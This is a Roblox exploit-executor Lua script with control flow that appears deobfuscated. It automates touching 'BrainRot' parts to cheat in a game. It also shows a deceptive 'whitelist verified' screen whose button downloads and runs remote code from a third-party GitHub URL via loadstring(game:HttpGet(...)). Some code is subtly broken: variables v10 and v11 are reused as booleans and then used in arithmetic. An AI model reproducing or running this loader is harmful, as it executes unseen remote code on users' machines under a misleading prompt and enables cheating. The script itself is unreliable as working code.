local v9 = "6027385792"
local v10 = "whitelist.txt"
local v11 = 30
if (writefile and not isfile("whitelist.txt")) then
    writefile("whitelist.txt", tostring(os.time()))
end
local v12 = 0
if (isfile and isfile("whitelist.txt")) then
    v12 = tonumber(readfile("whitelist.txt")) or 0
end
pcall(function()
    local v96 = 0
    local v97
    while true do
        if v96 == 0 then
            v97 = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("Backpack")
            if v97 then
                v97:Destroy()
            end
            break
        end
    end
end)
local v13 = Instance.new("ScreenGui")
v13.Name = "ScreenGui"
v13.ResetOnSpawn = false
v13.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local v17 = Instance.new("TextLabel")
v17.Size = UDim2.new(0, 340, 0, 30)
v17.AnchorPoint = Vector2.new(0.5, 1)
v17.Position = UDim2.new(0.5, 0, 0.5, -95)
v17.BackgroundTransparency = 1
v17.Text = "Mohon menunggu, sedang memverifikasi whitelist..."
v17.Font = Enum.Font.GothamBold
v17.TextSize = 16
v17.TextColor3 = Color3.fromRGB(255, 200, 0)
v17.TextStrokeTransparency = 0.6
v17.TextWrapped = true
v17.TextXAlignment = Enum.TextXAlignment.Center
v17.Parent = v13
local v32 = Instance.new("Frame")
v32.Size = UDim2.new(0, 340, 0, 300) -- Aumentado para acomodar novos botões
v32.AnchorPoint = Vector2.new(0.5, 0.5)
v32.Position = UDim2.new(0.5, 0, 0.5, 0)
v32.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
v32.BorderSizePixel = 0
v32.Parent = v13
Instance.new("UICorner", v32).CornerRadius = UDim.new(0, 14)
local v40 = Instance.new("ImageLabel")
v40.Size = UDim2.new(0, 100, 0, 60)
v40.Position = UDim2.new(0, 15, 0, 15)
v40.BackgroundTransparency = 1
v40.Image = "https://i.imgur.com/" .. v9 .. "n1FKBZq.png"
v40.Parent = v32
local v46 = Instance.new("TextLabel")
v46.Size = UDim2.new(1, -90, 0, 60)
v46.Position = UDim2.new(0, 85, 0, 15)
v46.BackgroundTransparency = 1
v46.Text = "Verifikasi Whitelist Sukses!"
v46.Font = Enum.Font.GothamBold
v46.TextSize = 20
v46.TextColor3 = Color3.fromRGB(255, 255, 255)
v46.TextXAlignment = Enum.TextXAlignment.Left
v46.Parent = v32
local v57 = Instance.new("TextBox")
v57.Size = UDim2.new(1, -30, 0, 40)
v57.Position = UDim2.new(0, 15, 0, 90)
v57.Text = "Username"
v57.Font = Enum.Font.Gotham
v57.TextSize = 18
v57.TextColor3 = Color3.fromRGB(20, 20, 20)
v57.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
v57.ClearTextOnFocus = false
pcall(function()
    v57.TextEditable = false
end)
v57.Parent = v32
Instance.new("UICorner", v57).CornerRadius = UDim.new(0, 12)
local v69 = Instance.new("TextButton")
v69.Size = UDim2.new(0, 100, 0, 40)
v69.Position = UDim2.new(0, 15, 0, 140)
v69.Text = "Salin Username"
v69.Font = Enum.Font.GothamBold
v69.TextSize = 16
v69.TextColor3 = Color3.fromRGB(255, 255, 255)
v69.BackgroundColor3 = Color3.fromRGB(220, 50, 255)
v69.Parent = v32
Instance.new("UICorner", v69).CornerRadius = UDim.new(0, 14)
v69.MouseButton1Click:Connect(function()
    if setclipboard then
        local v102 = 0
        local v103
        while true do
            if v102 == 0 then
                v103 = 0
                while true do
                    if v103 == 0 then
                        setclipboard("Username")
                        print("✅ Username berhasil disalin!")
                        break
                    end
                end
                break
            end
        end
    else
        warn("❌ Clipboard tidak tersedia.")
    end
end)
local v79 = Instance.new("TextButton")
v79.Size = UDim2.new(0, 100, 0, 40)
v79.Position = UDim2.new(0.52, -15, 0, 140)
v79.Text = "Buka Whitelist"
v79.Font = Enum.Font.GothamBold
v79.TextSize = 16
v79.TextColor3 = Color3.fromRGB(255, 255, 255)
v79.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
v79.Parent = v32
Instance.new("UICorner", v79).CornerRadius = UDim.new(0, 14)
v79.AutoButtonColor = false
v79.Active = false
-- Adicionando botões Start e Stop
local v100 = Instance.new("TextButton")
v100.Size = UDim2.new(0, 100, 0, 40)
v100.Position = UDim2.new(0, 15, 0, 190)
v100.Text = "Start"
v100.Font = Enum.Font.GothamBold
v100.TextSize = 16
v100.TextColor3 = Color3.fromRGB(255, 255, 255)
v100.BackgroundColor3 = Color3.fromRGB(17, 144, 210)
v100.Parent = v32
Instance.new("UICorner", v100).CornerRadius = UDim.new(0, 14)
local v101 = Instance.new("TextButton")
v101.Size = UDim2.new(0, 100, 0, 40)
v101.Position = UDim2.new(0.52, -15, 0, 190)
v101.Text = "Stop"
v101.Font = Enum.Font.GothamBold
v101.TextSize = 16
v101.TextColor3 = Color3.fromRGB(255, 255, 255)
v101.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
v101.Parent = v32
Instance.new("UICorner", v101).CornerRadius = UDim.new(0, 14)
local v102 = Instance.new("UIListLayout", v32)
v102.Padding = UDim.new(0, 10)
v102.FillDirection = Enum.FillDirection.Vertical
v102.SortOrder = Enum.SortOrder.LayoutOrder
v102.HorizontalAlignment = Enum.HorizontalAlignment.Center
-- Variáveis para controle de estado
local v10 = false
local v11 = false
-- Função de automação (adaptada do primeiro script)
local function v72()
    local v76 = 0
    local v77
    local v78
    while true do
        if v76 == 1 then
            v100.AutoButtonColor = false
            v100.BackgroundTransparency = 0.5
            v100.Active = false
            v101.Active = true
            v76 = 2
        end
        if v76 == 2 then
            v77 = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            v78 = v77:FindFirstChild("HumanoidRootPart")
            if not v78 then
                local v92 = 0
                local v93
                while true do
                    if v92 == 0 then
                        v93 = 0
                        while true do
                            local v103 = 0
                            local v104
                            while true do
                                if v103 == 0 then
                                    v104 = 0
                                    while true do
                                        if v104 == 0 then
                                            if v93 == 0 then
                                                v46.Text = "HumanoidRootPart not found!"
                                                v10 = false
                                                v93 = 1
                                            end
                                            if v93 == 3 then
                                                return
                                            end
                                            v104 = 1
                                        end
                                        if v104 == 1 then
                                            if v93 == 1 then
                                                v100.Text = "Done!"
                                                v100.BackgroundTransparency = 0
                                                v93 = 2
                                            end
                                            if v93 == 2 then
                                                v100.AutoButtonColor = true
                                                v100.Active = true
                                                v93 = 3
                                            end
                                            break
                                        end
                                    end
                                    break
                                end
                            end
                            break
                        end
                        break
                    end
                end
            end
            for v90 = 1, 20 do
                if v11 then
                    v46.Text = "Process Stopped!"
                    break
                end
                v46.Text = "Processing... " .. tostring(math.floor((2 - ((v90 - 1) * 0.1)) * 10) / 10) .. "s"
                task.wait(0.1)
            end
            v76 = 3
        end
        if v76 == 0 then
            if v10 then
                return
            end
            v10 = true
            v11 = false
            v100.Text = "Processing..."
            v76 = 1
        end
        if v76 == 3 then
            if not v11 then
                for v97 = 1, 20 do
                    if v11 then
                        v46.Text = "Process Stopped!"
                        break
                    end
                    for v98, v99 in ipairs(workspace:GetDescendants()) do
                        if v99:IsA("Part") and v99.Name == "BrainRot" then
                            pcall(function()
                                local v103 = 0
                                while true do
                                    if v103 == 1 then
                                        firetouchinterest(v78, v99, 1)
                                        break
                                    end
                                    if v103 == 0 then
                                        firetouchinterest(v78, v99, 0)
                                        task.wait(0.13)
                                        v103 = 1
                                    end
                                end
                            end)
                        end
                    end
                end
            end
            if v11 then
                v46.Text = "Process Stopped!"
            else
                v46.Text = "Done!"
            end
            v10 = false
            v100.Text = "Start"
            v76 = 4
        end
        if v76 == 4 then
            v100.BackgroundTransparency = 0
            v100.AutoButtonColor = true
            v100.Active = true
            break
        end
    end
end
v100.MouseButton1Click:Connect(v72)
v101.MouseButton1Click:Connect(function()
    if v10 then
        v11 = true
    else
        v46.Text = "No process running!"
    end
end)
-- Função de contagem regressiva da whitelist
local function v91()
    while true do
        local v100 = os.time()
        local v101 = v11 - (v100 - v12)
        if v101 <= 0 then
            v79.Text = "Buka Whitelist"
            v79.AutoButtonColor = true
            v79.Active = true
            break
        else
            local v107 = 0
            local v108
            local v109
            while true do
                if v107 == 1 then
                    v79.Text = string.format("Menunggu %d menit %d detik", v108, v109)
                    break
                end
                if v107 == 0 then
                    v108 = math.floor(v101 / 60)
                    v109 = v101 % 60
                    v107 = 1
                end
            end
        end
        wait(1)
    end
end
task.spawn(v91)
v79.MouseButton1Click:Connect(function()
    if not v79.Active then
        return
    end
    v13:Destroy()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Adiventer/Whitelist/main/Whitelist.lua"))()
end)
-- Notificação inicial
local v92 = "notification.txt"
if not isfile(v92) then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Verifikasi Whitelist Sukses!",
        Text = "Mohon menunggu, sedang memverifikasi whitelist...",
        Duration = 300
    })
    writefile(v92, "done")
end
